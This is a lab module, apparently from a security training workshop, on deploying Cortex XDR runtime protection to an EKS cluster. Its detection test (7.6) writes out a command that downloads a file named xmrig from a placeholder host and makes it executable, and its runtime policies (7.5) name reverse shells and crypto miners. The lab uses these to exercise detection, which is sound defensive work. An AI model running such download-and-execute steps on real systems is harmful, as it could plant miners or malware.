# Module 7 — Protect EKS Workloads

## Overview

In this module you deploy Cortex Cloud runtime protection to your Amazon EKS cluster. This includes deploying the Cortex XDR agent as a DaemonSet and configuring Kubernetes-aware security policies.

## Prerequisites

* EKS cluster deployed in Module 1
* `kubectl` configured to access the cluster
* Helm installed

## Steps

### 7.1 — Configure kubectl

```bash
aws eks update-kubeconfig --name cortex-lab-eks --region <region>
kubectl get nodes
```

### 7.2 — Deploy Cortex XDR Agent DaemonSet

1. In Cortex Cloud, navigate to **Settings → Agent Installations → Kubernetes**.
2. Copy the Helm installation command.

```bash
# Add the Cortex Cloud Helm repository
helm repo add cortex-cloud https://demisto.github.io/cortex-helm
helm repo update

# Install the Cortex XDR agent DaemonSet
helm install cortex-xdr cortex-cloud/cortex-xdr-agent \
  --namespace cortex-system \
  --create-namespace \
  --set cluster.name=cortex-lab-eks \
  --set secret.apiKey=<your-api-key> \
  --set secret.apiKeyId=<your-api-key-id>
```

### 7.3 — Verify Deployment

```bash
kubectl get pods -n cortex-system
kubectl get daemonset -n cortex-system
```

All agent pods should be in `Running` state.

### 7.4 — Deploy a Sample Vulnerable Application

```bash
kubectl apply -f templates/dvwa-deployment.yaml
kubectl get pods -n dvwa
```

### 7.5 — Configure Runtime Policies

1. Navigate to **Cloud Runtime Security → Policies → Runtime**.
2. Create a new runtime policy for containers:
   * **Scope**: Apply to EKS cluster `cortex-lab-eks`
   * **Process rules**: Block reverse shells, crypto miners
   * **Network rules**: Detect anomalous outbound connections
   * **File system rules**: Detect writes to sensitive paths

### 7.6 — Test Runtime Detection

```bash
# Exec into a pod and simulate suspicious activity
kubectl exec -it <dvwa-pod-name> -n dvwa -- /bin/bash

# Inside the pod — simulate crypto miner behavior
curl -o /tmp/xmrig http://example.com/test
chmod +x /tmp/xmrig
```

Review the alert generated in **Incidents & Alerts**.

### 7.7 — Admission Control

1. Navigate to **Cloud Runtime Security → Admission Control**.
2. Configure admission policies:
   * Block deployment of images with critical unpatched CVEs
   * Block privileged containers
   * Block containers running as root
   * Enforce resource limits

## Key Concepts

| Concept | Description |
|---|---|
| **DaemonSet Deployment** | Cortex XDR agent runs on every node in the cluster |
| **Runtime Policies** | Rules for process, network and file system activity |
| **Admission Control** | Kubernetes admission controller to enforce policies at deploy time |
| **Incident Correlation** | Alerts are correlated with cloud context (cluster, namespace, pod) |

## Next Steps

Proceed to [Module 8 — Protect ECS Workloads](8-protect-ecs-workloads.md).
